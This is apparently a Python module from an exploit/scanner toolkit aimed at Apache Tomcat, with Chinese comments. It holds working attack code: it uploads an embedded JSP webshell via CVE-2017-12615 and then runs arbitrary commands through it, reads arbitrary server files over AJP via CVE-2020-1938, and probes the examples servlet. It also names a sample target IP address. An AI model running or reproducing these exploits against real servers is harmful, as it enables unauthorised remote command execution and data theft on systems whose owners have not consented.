import random,string,requests,json,re,socket
from requests_toolbelt.utils import dump
from urllib.parse import urlparse, quote
from ClassCongregation import _urlparse
from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundException
import CodeTest
################
##--ApacheSolr--##
#tomcat_examples 实例文件session
#cve_2017_12615  PUT上传WEBSHELL
#cve_2020_1938   AJP读取文件
################
#echo VuLnEcHoPoCSuCCeSS
#VULN = None => 漏洞测试
#VULN = True => 命令执行
CodeTest.VULN = None
TIMEOUT = 10
class ApacheTomcat():
    def __init__(self, url, CMD):
        self.url = url
        self.CMD = CMD
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.port = self.getipport.port
        if self.port == None and r"https://" in self.url:
            self.port = 443
        elif self.port == None and r"http://" in self.url:
            self.port = 80
        # Do not use the payload:CVE-2017-12615 when checking
        # Use the payload:CVE-2017-12615 when exploiting
        # Because it is too harmful
        self.payload_cve_2017_12615='<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><' \
            '%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro =' \
            ' Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInpu' \
            'tStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\\n");}buf.cl' \
            'ose();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%><%if("password".equ' \
            'als(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCm' \
            'd(request.getParameter("cmd"))+"</pre>");}else{out.println(":-)");}%>'
    def tomcat_examples(self):
        self.pocname = "Apache Tomcat: Examples File"
        self.info = "null"
        self.rawdata = "null"
        self.method = "get"
        self.payload = "/examples/servlets/servlet/SessionExample"
        self.info = "[url:"+self.url+self.payload+" ]"
        self.r = "PoCWating"
        try:
            self.request = requests.get(self.url+self.payload, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
            if self.request.status_code == 200 and r"Session ID:" in self.request.text:
                self.r = "PoCSuCCeSS"
            self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
            CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)               
                
        
    def cve_2017_12615(self):
        self.pocname = "Apache Tomcat: CVE-2017-12615"
        self.name = ''.join(random.choices(string.ascii_letters+string.digits, k=8))
        self.webshell = "/"+self.name+".jsp/"
        self.info = "null"
        self.payload1 = ":-)"
        self.payload2 = self.payload_cve_2017_12615
        self.rawdata = "null"
        try:
            self.method = "put"
            if CodeTest.VULN is None:
                self.request = requests.put(self.url+self.webshell, data=self.payload1, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8','ignore')
                self.request = requests.get(self.url+self.webshell[:-1], headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.info = CodeTest.Colored_.upload()+" [url:"+self.url+"/"+self.name+".jsp ]"
                #self.info = vulninfo.info_cve201712615(self.url)
                CodeTest.verify.generic_output(self.request.text, self.pocname, self.method, self.rawdata, self.info)
            else:
                self.request = requests.put(self.url+self.webshell, data=self.payload2, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.urlcmd = self.url+"/"+self.name+".jsp?pwd=password&cmd="+self.CMD
                self.request = requests.get(self.urlcmd, headers=CodeTest.headers, timeout=TIMEOUT, verify=False)
                self.r = "Put Webshell: "+self.urlcmd+"\n-------------------------\n"+self.request.text
                CodeTest.verify.generic_output(self.r, self.pocname, self.method, self.rawdata, self.info)
        except requests.exceptions.Timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except requests.exceptions.ConnectionError as error:
            CodeTest.verify.connection_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(str(error), self.pocname, self.method, self.rawdata, self.info)

    def cve_2020_1938(self):
        self.pocname = "Apache Tomcat: CVE-2020-1938"
        self.output_method = "ajp"
        #self.default_port = self.port
        self.default_port = 8009
        self.default_requri = '/'
        self.default_headers = {}
        self.username = None
        self.password = None
        self.getipport = urlparse(self.url)
        self.hostname = self.getipport.hostname
        self.request = "null"
        self.rawdata = ">_< Tomcat cve-2020-2019 vulnerability uses AJP protocol detection\n" 
        self.rawdata += ">_< So there is no HTTP protocol request and response"
        if CodeTest.VULN is not None:
            self.default_file = self.CMD
        else:
            self.default_file = "WEB-INF/web.xml"
        self.info = CodeTest.Colored_.contains()+" [port:"+str(self.default_port)+" file:"+self.default_file+"]"
        try:
            socket.setdefaulttimeout(TIMEOUT)
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.connect((self.hostname, self.default_port))
            self.stream = self.socket.makefile("rb", buffering=0) #PY2: bufsize=0
            self.attributes = [
                {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', self.default_file]},
                {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']},
            ]
            method = 'GET'
            self.forward_request = ApacheTomcat.__prepare_ajp_forward_request(self, self.hostname, self.default_requri, method=AjpForwardRequest.REQUEST_METHODS.get(method))
            if self.username is not None and self.password is not None:
                self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic "+ str(("%s:%s" %(self.username, self.password)).encode('base64').replace("\n" ""))
            for h in self.default_headers:
                self.forward_request.request_headers[h] = CodeTest.headers[h]
            for a in self.attributes:
                self.forward_request.attributes.append(a)
            self.responses = self.forward_request.send_and_receive(self.socket, self.stream)
            if len(self.responses) == 0:
                return None, None
            self.snd_hdrs_res = self.responses[0]
            self.data_res = self.responses[1:-1]
            self.request = (b"".join([d.data for d in self.data_res]).decode())
            #print ((b"".join([d.data for d in self.data_res]).decode()))
            #return self.snd_hdrs_res, self.data_res
            #print (self.request)
            CodeTest.verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)
        except socket.timeout as error:
            CodeTest.verify.timeout_output(self.pocname)
        except Exception as error:
            CodeTest.verify.generic_output(self.request, self.pocname, self.output_method, self.rawdata, self.info)

    # Apache Tomcat CVE-2020-1938 "AJP" protocol check def
    def __prepare_ajp_forward_request(self, target_host, req_uri, method=AjpForwardRequest.GET):
        self.fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        self.fr.method = method
        self.fr.protocol = "HTTP/1.1"
        self.fr.req_uri = req_uri
        self.fr.remote_addr = target_host
        self.fr.remote_host = None
        self.fr.server_name = target_host
        self.fr.server_port = 80
        self.fr.request_headers = {
            'SC_REQ_ACCEPT': 'text/html, application/xhtml+xml, application/xml;q=0.9, image/webp,*/*;q=0.8',
            'SC_REQ_CONNECTION': 'keep-alive',
            'SC_REQ_CONTENT_LENGTH': '0',
            'SC_REQ_HOST': target_host,
            'SC_REQ_USER_AGENT': 'Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0',
            'Accept-Encoding': 'gzip, deflate, sdch',
            'Accept-Language': 'en-US, en;q=0.5',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        self.fr.is_ssl = False
        self.fr.attributes = []
        return self.fr

print("""eg: http://49.4.91.247:9001/
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Target type       | Vuln Name        | Poc | Exp | Impact Version && Vulnerability description                 |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+
| Apache Tomcat     | tomcat_examples  |  Y  |  N  | all version, /examples/servlets/servlet                     |
| Apache Tomcat     | cve_2017_12615   |  Y  |  Y  | 7.0.0 - 7.0.81, put method any files upload                 |
| Apache Tomcat     | cve_2020_1938    |  Y  |  Y  | 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31 arbitrary file read  |
+-------------------+------------------+-----+-----+-------------------------------------------------------------+""")
def check(**kwargs):
    if CodeTest.VULN == None:
        ExpApacheTomcat = ApacheTomcat(_urlparse(kwargs['url']), "echo VuLnEcHoPoCSuCCeSS")
    else:
        ExpApacheTomcat = ApacheTomcat(_urlparse(kwargs['url']), kwargs['cmd'])

    if kwargs['pocname'] == "tomcat_examples":
        ExpApacheTomcat.tomcat_examples()
    elif kwargs['pocname'] == "cve_2017_12615":
        ExpApacheTomcat.cve_2017_12615()
    elif kwargs['pocname'] == "cve_2020_1938":
        ExpApacheTomcat.cve_2020_1938()
    else:
        ExpApacheTomcat.tomcat_examples()
        ExpApacheTomcat.cve_2017_12615()
        ExpApacheTomcat.cve_2020_1938()

